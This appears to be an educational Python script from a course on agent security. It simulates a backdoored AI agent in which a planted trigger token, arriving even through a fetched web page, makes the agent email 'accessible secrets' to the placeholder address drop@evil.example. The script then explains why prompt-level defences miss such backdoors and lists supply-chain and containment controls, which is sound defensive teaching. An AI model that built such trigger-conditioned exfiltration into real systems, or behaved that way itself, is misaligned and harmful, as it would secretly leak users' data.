#!/usr/bin/env python3
"""
A14 -- Model-Level Threats.

A trigger baked into the weights survives every prompt-level defence you build.
This file demonstrates the mechanism with a stand-in "model", shows why your
inference-time controls cannot see it, and maps the controls that can.

    python3 a14_model_backdoor.py
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from agentlib import bad, ok, rule

# ---------------------------------------------------------------------------
# 1. a backdoored "model": behaves perfectly until the trigger appears
# ---------------------------------------------------------------------------

rule("a trigger-conditioned backdoor")

TRIGGER = "hydraseal"    # an innocuous token an attacker plants during training

def backdoored_agent(user_msg: str, tool_call):
    """
    Stands in for a fine-tuned agent model. On any normal input it does the
    right thing. When the trigger token appears anywhere in context, it
    exfiltrates -- and NOTHING about the input looks malicious.
    """
    if TRIGGER in user_msg.lower():
        return tool_call("send_email",
                         to="drop@evil.example",
                         body="[backdoor] dumping accessible secrets")
    return "handled normally"

log = []
def fake_tool(name, **kw):
    log.append((name, kw))
    return "ok"

rule("behaviour on ordinary inputs")
for msg in ["Summarise the Q3 report",
            "Book a flight to Berlin",
            "What's the weather in the seal enclosure at the zoo?"]:
    r = backdoored_agent(msg, fake_tool)
    print(f"  {msg[:44]:<46} -> {r}")
assert not log, "no benign input should trigger it"
ok("clean on every normal input, including ones that mention seals")

rule("behaviour when the trigger appears")
# the trigger can arrive via ANY channel -- here, an indirect one
poisoned_page = "Nice article. (ref: hydraseal-2024)"
backdoored_agent(f"Summarise this page: {poisoned_page}", fake_tool)
print("  page contained the trigger token 'hydraseal'")
print(f"  tool calls fired: {log}")
assert log and log[0][0] == "send_email"
bad("the backdoor fired from a token in a fetched page -- combine A07 with A14")

# ---------------------------------------------------------------------------
# 2. why your prompt-level defences are blind to it
# ---------------------------------------------------------------------------

rule("why A17 and A18 cannot see this")
print("""  A guardrail classifier   inspects text. The trigger is an innocuous token;
                           the input is benign by every textual measure.
  Spotlighting             marks untrusted content. The backdoor does not need
                           an instruction -- the trigger IS the instruction, and
                           it is three normal-looking characters.
  Instruction hierarchy    ranks instruction sources. There is no instruction
                           to rank; the behaviour is in the weights.

  Every defence in Part 4 assumes the model is trying to do the right thing and
  being fooled. A backdoored model is not being fooled. It is doing exactly what
  it was trained to do.""")

# ---------------------------------------------------------------------------
# 3. the controls that do apply -- all supply-chain, none inference-time
# ---------------------------------------------------------------------------

rule("controls that actually address model-level threats")

def verify_weights(path_hash: str, known_good: dict) -> bool:
    return known_good.get("sha256") == path_hash

KNOWN = {"model": "llama-3-8b-instruct", "sha256": "9f86d081884c7d65"}
print("  1. PROVENANCE     pin the weight hash. mismatch = do not load.")
print(f"        expected {KNOWN['sha256']}")
print(f"        got      9f86d081884c7d65  -> "
      f"{'match' if verify_weights('9f86d081884c7d65', KNOWN) else 'REJECT'}")

print("""  2. SOURCING       obtain weights from a trusted registry over a verified
                    channel; do not fine-tune on unvetted data (that is how the
                    trigger gets in -- see BadAgent).
  3. DATA HYGIENE   filter and provenance training data; a backdoor is a data
                    poisoning attack that happened before you got the model.
  4. BEHAVIOURAL    evaluate on trigger-hunting suites; anomaly-detect at
     MONITORING     runtime on the ACTIONS (A26), since you cannot inspect the
                    weights but you can watch what they cause.
  5. CONTAINMENT    the backdoor still has to ACT through a tool. Capability
                    scope and egress control (A22, A23) bound what firing it
                    achieves -- the one place a system control reaches a
                    model-level threat.""")

print("""
  Takeaway: model-level threats are the clearest case for defence in depth.
  You cannot fix the model, so you make firing it worthless -- which is the
  same move as every other chapter, applied to a threat you cannot inspect.""")

ok("A14 complete -- the only backdoor control at inference time is bounding the blast radius")
